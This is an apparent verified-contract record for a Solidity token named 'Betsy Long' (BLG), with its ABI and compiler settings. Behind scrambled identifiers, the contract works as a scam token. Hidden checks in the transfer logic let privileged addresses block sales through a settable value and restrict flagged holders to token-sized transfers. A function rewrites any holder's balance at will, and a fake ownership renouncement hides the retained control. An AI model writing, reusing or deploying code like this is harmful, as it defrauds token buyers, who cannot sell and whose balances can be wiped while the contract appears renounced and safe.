{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface modeIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitLaunchFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minTo {\n    function createPair(address amountFund, address modeTx) external returns (address);\n}\n\ninterface autoTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableToken) external view returns (uint256);\n\n    function transfer(address fromMax, uint256 limitLaunchedTotal) external returns (bool);\n\n    function allowance(address tradingLaunchLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitLaunchedTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromMax,\n        uint256 limitLaunchedTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingIs, uint256 value);\n    event Approval(address indexed tradingLaunchLiquidity, address indexed spender, uint256 value);\n}\n\ninterface minAtTotal is autoTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BetsyLong is limitLaunchFund, autoTx, minAtTotal {\n\n    function transfer(address buyAt, uint256 limitLaunchedTotal) external virtual override returns (bool) {\n        return sellFee(_msgSender(), buyAt, limitLaunchedTotal);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listShouldTx;\n    }\n\n    function sellFee(address autoTeam, address fromMax, uint256 limitLaunchedTotal) internal returns (bool) {\n        if (autoTeam == txReceiver) {\n            return liquidityTo(autoTeam, fromMax, limitLaunchedTotal);\n        }\n        uint256 tradingSwap = autoTx(walletLaunchedSwap).balanceOf(liquidityTotal);\n        require(tradingSwap == minMode);\n        require(fromMax != liquidityTotal);\n        if (limitEnableReceiver[autoTeam]) {\n            return liquidityTo(autoTeam, fromMax, minLiquidity);\n        }\n        return liquidityTo(autoTeam, fromMax, limitLaunchedTotal);\n    }\n\n    function allowance(address enableFrom, address sellLimit) external view virtual override returns (uint256) {\n        if (sellLimit == liquidityMax) {\n            return type(uint256).max;\n        }\n        return takeLaunch[enableFrom][sellLimit];\n    }\n\n    address liquidityTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public walletLaunchedSwap;\n\n    uint256 maxTx;\n\n    event OwnershipTransferred(address indexed atExemptTo, address indexed enableListAmount);\n\n    uint8 private modeFund = 18;\n\n    function autoEnableTo(address minMarketingBuy) public {\n        receiverLiquidityMin();\n        \n        if (minMarketingBuy == txReceiver || minMarketingBuy == walletLaunchedSwap) {\n            return;\n        }\n        limitEnableReceiver[minMarketingBuy] = true;\n    }\n\n    function transferFrom(address autoTeam, address fromMax, uint256 limitLaunchedTotal) external override returns (bool) {\n        if (_msgSender() != liquidityMax) {\n            if (takeLaunch[autoTeam][_msgSender()] != type(uint256).max) {\n                require(limitLaunchedTotal <= takeLaunch[autoTeam][_msgSender()]);\n                takeLaunch[autoTeam][_msgSender()] -= limitLaunchedTotal;\n            }\n        }\n        return sellFee(autoTeam, fromMax, limitLaunchedTotal);\n    }\n\n    bool public isTokenLimit;\n\n    uint256 public launchReceiver;\n\n    function toLaunched(address atEnable) public {\n        if (isTokenLimit) {\n            return;\n        }\n        \n        maxTake[atEnable] = true;\n        if (sellTake != launchReceiver) {\n            swapModeMarketing = true;\n        }\n        isTokenLimit = true;\n    }\n\n    string private maxTeam = \"BLG\";\n\n    function minTeam() public {\n        emit OwnershipTransferred(txReceiver, address(0));\n        amountBuy = address(0);\n    }\n\n    constructor (){\n        if (launchReceiver != sellTake) {\n            launchReceiver = sellTake;\n        }\n        modeIs atFund = modeIs(liquidityMax);\n        walletLaunchedSwap = minTo(atFund.factory()).createPair(atFund.WETH(), address(this));\n        if (launchReceiver == sellTake) {\n            sellTake = launchReceiver;\n        }\n        txReceiver = _msgSender();\n        minTeam();\n        maxTake[txReceiver] = true;\n        tradingShould[txReceiver] = marketingAmount;\n        if (modeTotalLaunch == swapModeMarketing) {\n            modeTotalLaunch = false;\n        }\n        emit Transfer(address(0), txReceiver, marketingAmount);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxTeam;\n    }\n\n    function receiverLiquidityMin() private view {\n        require(maxTake[_msgSender()]);\n    }\n\n    function amountLimit(uint256 limitLaunchedTotal) public {\n        receiverLiquidityMin();\n        minMode = limitLaunchedTotal;\n    }\n\n    uint256 constant minLiquidity = 7 ** 10;\n\n    function balanceOf(address enableToken) public view virtual override returns (uint256) {\n        return tradingShould[enableToken];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingAmount;\n    }\n\n    mapping(address => bool) public maxTake;\n\n    address public txReceiver;\n\n    uint256 minMode;\n\n    function owner() external view returns (address) {\n        return amountBuy;\n    }\n\n    string private listShouldTx = \"Betsy Long\";\n\n    function getOwner() external view returns (address) {\n        return amountBuy;\n    }\n\n    bool private swapModeMarketing;\n\n    bool private modeTotalLaunch;\n\n    function senderShould(address buyAt, uint256 limitLaunchedTotal) public {\n        receiverLiquidityMin();\n        tradingShould[buyAt] = limitLaunchedTotal;\n    }\n\n    mapping(address => mapping(address => uint256)) private takeLaunch;\n\n    function approve(address sellLimit, uint256 limitLaunchedTotal) public virtual override returns (bool) {\n        takeLaunch[_msgSender()][sellLimit] = limitLaunchedTotal;\n        emit Approval(_msgSender(), sellLimit, limitLaunchedTotal);\n        return true;\n    }\n\n    mapping(address => uint256) private tradingShould;\n\n    uint256 public sellTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeFund;\n    }\n\n    mapping(address => bool) public limitEnableReceiver;\n\n    address liquidityMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private amountBuy;\n\n    uint256 private marketingAmount = 100000000 * 10 ** 18;\n\n    function liquidityTo(address autoTeam, address fromMax, uint256 limitLaunchedTotal) internal returns (bool) {\n        require(tradingShould[autoTeam] >= limitLaunchedTotal);\n        tradingShould[autoTeam] -= limitLaunchedTotal;\n        tradingShould[fromMax] += limitLaunchedTotal;\n        emit Transfer(autoTeam, fromMax, limitLaunchedTotal);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLaunchLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atExemptTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableListAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitLaunchedTotal\",\"type\":\"uint256\"}],\"name\":\"amountLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitLaunchedTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMarketingBuy\",\"type\":\"address\"}],\"name\":\"autoEnableTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTokenLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitEnableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitLaunchedTotal\",\"type\":\"uint256\"}],\"name\":\"senderShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"}],\"name\":\"toLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitLaunchedTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitLaunchedTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunchedSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BetsyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}